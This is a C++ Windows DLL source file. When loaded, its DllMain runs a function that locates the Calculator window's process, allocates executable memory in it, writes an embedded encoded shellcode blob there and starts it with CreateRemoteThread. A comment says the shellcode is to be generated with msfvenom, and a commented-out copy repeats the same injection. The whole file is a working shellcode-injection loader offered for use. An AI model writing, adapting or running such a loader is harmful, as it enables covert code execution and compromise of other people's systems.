// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "Windows.h"
#include <thread>
#include <string>
#include <libloaderapi.h>
void get_pro_id(const char* window_title, DWORD& process_id)
{
	GetWindowThreadProcessId(FindWindow(NULL, window_title), &process_id);
}
//int main() {
//	DWORD proc_id = NULL;
//	const char* window_title = "Calculator";
//	unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
//		"\xff\xff\x48\xbb\xe7\xd1\xd0\xbe\xae\xcd\xd7\x72\x48\x31\x58"
//		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x1b\x99\x53\x5a\x5e\x25"
//		"\x17\x72\xe7\xd1\x91\xef\xef\x9d\x85\x23\xb1\x99\xe1\x6c\xcb"
//		"\x85\x5c\x20\x87\x99\x5b\xec\xb6\x85\x5c\x20\xc7\x99\x5b\xcc"
//		"\xfe\x85\xd8\xc5\xad\x9b\x9d\x8f\x67\x85\xe6\xb2\x4b\xed\xb1"
//		"\xc2\xac\xe1\xf7\x33\x26\x18\xdd\xff\xaf\x0c\x35\x9f\xb5\x90"
//		"\x81\xf6\x25\x9f\xf7\xf9\xa5\xed\x98\xbf\x7e\x46\x57\xfa\xe7"
//		"\xd1\xd0\xf6\x2b\x0d\xa3\x15\xaf\xd0\x00\xee\x25\x85\xcf\x36"
//		"\x6c\x91\xf0\xf7\xaf\x1d\x34\x24\xaf\x2e\x19\xff\x25\xf9\x5f"
//		"\x3a\xe6\x07\x9d\x8f\x67\x85\xe6\xb2\x4b\x90\x11\x77\xa3\x8c"
//		"\xd6\xb3\xdf\x31\xa5\x4f\xe2\xce\x9b\x56\xef\x94\xe9\x6f\xdb"
//		"\x15\x8f\x36\x6c\x91\xf4\xf7\xaf\x1d\xb1\x33\x6c\xdd\x98\xfa"
//		"\x25\x8d\xcb\x3b\xe6\x01\x91\x35\xaa\x45\x9f\x73\x37\x90\x88"
//		"\xff\xf6\x93\x8e\x28\xa6\x89\x91\xe7\xef\x97\x9f\xf1\x0b\xf1"
//		"\x91\xec\x51\x2d\x8f\x33\xbe\x8b\x98\x35\xbc\x24\x80\x8d\x18"
//		"\x2e\x8d\xf7\x10\xba\xa4\x40\xb8\xe2\xe2\xbe\xae\x8c\x81\x3b"
//		"\x6e\x37\x98\x3f\x42\x6d\xd6\x72\xe7\x98\x59\x5b\xe7\x71\xd5"
//		"\x72\xe6\x6a\x10\x16\xaf\x4d\x96\x26\xae\x58\x34\xf2\x27\x3c"
//		"\x96\xc8\xab\xa6\xf6\xb9\x51\x18\x9b\xfb\x0d\xb9\xd1\xbf\xae"
//		"\xcd\x8e\x33\x5d\xf8\x50\xd5\xae\x32\x02\x22\xb7\x9c\xe1\x77"
//		"\xe3\xfc\x17\x3a\x18\x11\x98\x37\x6c\x85\x28\xb2\xaf\x58\x11"
//		"\xff\x14\x27\xd8\xad\x07\x2e\x05\xf6\x27\x0a\xbd\x62\xa6\x89"
//		"\x9c\x37\x4c\x85\x5e\x8b\xa6\x6b\x49\x1b\xda\xac\x28\xa7\xaf"
//		"\x50\x14\xfe\xac\xcd\xd7\x3b\x5f\xb2\xbd\xda\xae\xcd\xd7\x72"
//		"\xe7\x90\x80\xff\xfe\x85\x5e\x90\xb0\x86\x87\xf3\x9f\x0d\xbd"
//		"\x7f\xbe\x90\x80\x5c\x52\xab\x10\x36\xc3\x85\xd1\xbf\xe6\x40"
//		"\x93\x56\xff\x17\xd0\xd6\xe6\x44\x31\x24\xb7\x90\x80\xff\xfe"
//		"\x8c\x87\x3b\x18\x11\x91\xee\xe7\x32\x1f\x3f\x6e\x10\x9c\x37"
//		"\x6f\x8c\x6d\x0b\x2b\xee\x56\x41\x7b\x85\xe6\xa0\xaf\x2e\x1a"
//		"\x35\xa0\x8c\x6d\x7a\x60\xcc\xb0\x41\x7b\x76\x27\xc7\x45\x87"
//		"\x91\x04\x08\x58\x6a\xef\x18\x04\x98\x3d\x6a\xe5\xeb\x74\x9b"
//		"\xdb\x50\x45\x4e\xb8\xd2\xc9\xa0\xc2\xa2\xd1\xc4\xcd\x8e\x33"
//		"\x6e\x0b\x2f\x6b\xae\xcd\xd7\x72";
//	HANDLE processHandle;
//	HANDLE remoteThread;
//	PVOID remoteBuffer;
//	get_pro_id(window_title, proc_id);
//	processHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, proc_id);
//	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
//	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
//	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
//	CloseHandle(processHandle);
//
//	return 0;
//}
extern "C" __declspec(dllexport) int main() {
	DWORD proc_id = NULL;
	const char* window_title = "Calculator";
	//Shellcode you will generate with msfvenom and insert in value shellcode[] ^^
	unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\xe7\xd1\xd0\xbe\xae\xcd\xd7\x72\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x1b\x99\x53\x5a\x5e\x25"
		"\x17\x72\xe7\xd1\x91\xef\xef\x9d\x85\x23\xb1\x99\xe1\x6c\xcb"
		"\x85\x5c\x20\x87\x99\x5b\xec\xb6\x85\x5c\x20\xc7\x99\x5b\xcc"
		"\xfe\x85\xd8\xc5\xad\x9b\x9d\x8f\x67\x85\xe6\xb2\x4b\xed\xb1"
		"\xc2\xac\xe1\xf7\x33\x26\x18\xdd\xff\xaf\x0c\x35\x9f\xb5\x90"
		"\x81\xf6\x25\x9f\xf7\xf9\xa5\xed\x98\xbf\x7e\x46\x57\xfa\xe7"
		"\xd1\xd0\xf6\x2b\x0d\xa3\x15\xaf\xd0\x00\xee\x25\x85\xcf\x36"
		"\x6c\x91\xf0\xf7\xaf\x1d\x34\x24\xaf\x2e\x19\xff\x25\xf9\x5f"
		"\x3a\xe6\x07\x9d\x8f\x67\x85\xe6\xb2\x4b\x90\x11\x77\xa3\x8c"
		"\xd6\xb3\xdf\x31\xa5\x4f\xe2\xce\x9b\x56\xef\x94\xe9\x6f\xdb"
		"\x15\x8f\x36\x6c\x91\xf4\xf7\xaf\x1d\xb1\x33\x6c\xdd\x98\xfa"
		"\x25\x8d\xcb\x3b\xe6\x01\x91\x35\xaa\x45\x9f\x73\x37\x90\x88"
		"\xff\xf6\x93\x8e\x28\xa6\x89\x91\xe7\xef\x97\x9f\xf1\x0b\xf1"
		"\x91\xec\x51\x2d\x8f\x33\xbe\x8b\x98\x35\xbc\x24\x80\x8d\x18"
		"\x2e\x8d\xf7\x10\xba\xa4\x40\xb8\xe2\xe2\xbe\xae\x8c\x81\x3b"
		"\x6e\x37\x98\x3f\x42\x6d\xd6\x72\xe7\x98\x59\x5b\xe7\x71\xd5"
		"\x72\xe6\x6a\x10\x16\xaf\x4d\x96\x26\xae\x58\x34\xf2\x27\x3c"
		"\x96\xc8\xab\xa6\xf6\xb9\x51\x18\x9b\xfb\x0d\xb9\xd1\xbf\xae"
		"\xcd\x8e\x33\x5d\xf8\x50\xd5\xae\x32\x02\x22\xb7\x9c\xe1\x77"
		"\xe3\xfc\x17\x3a\x18\x11\x98\x37\x6c\x85\x28\xb2\xaf\x58\x11"
		"\xff\x14\x27\xd8\xad\x07\x2e\x05\xf6\x27\x0a\xbd\x62\xa6\x89"
		"\x9c\x37\x4c\x85\x5e\x8b\xa6\x6b\x49\x1b\xda\xac\x28\xa7\xaf"
		"\x50\x14\xfe\xac\xcd\xd7\x3b\x5f\xb2\xbd\xda\xae\xcd\xd7\x72"
		"\xe7\x90\x80\xff\xfe\x85\x5e\x90\xb0\x86\x87\xf3\x9f\x0d\xbd"
		"\x7f\xbe\x90\x80\x5c\x52\xab\x10\x36\xc3\x85\xd1\xbf\xe6\x40"
		"\x93\x56\xff\x17\xd0\xd6\xe6\x44\x31\x24\xb7\x90\x80\xff\xfe"
		"\x8c\x87\x3b\x18\x11\x91\xee\xe7\x32\x1f\x3f\x6e\x10\x9c\x37"
		"\x6f\x8c\x6d\x0b\x2b\xee\x56\x41\x7b\x85\xe6\xa0\xaf\x2e\x1a"
		"\x35\xa0\x8c\x6d\x7a\x60\xcc\xb0\x41\x7b\x76\x27\xc7\x45\x87"
		"\x91\x04\x08\x58\x6a\xef\x18\x04\x98\x3d\x6a\xe5\xeb\x74\x9b"
		"\xdb\x50\x45\x4e\xb8\xd2\xc9\xa0\xc2\xa2\xd1\xc4\xcd\x8e\x33"
		"\x6e\x0b\x2f\x6b\xae\xcd\xd7\x72";
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	get_pro_id(window_title, proc_id);
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, proc_id);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}
BOOL WINAPI DllMain(
	HINSTANCE hinstDLL,  
	DWORD fdwReason,    
	LPVOID lpReserved)  
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		main();
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

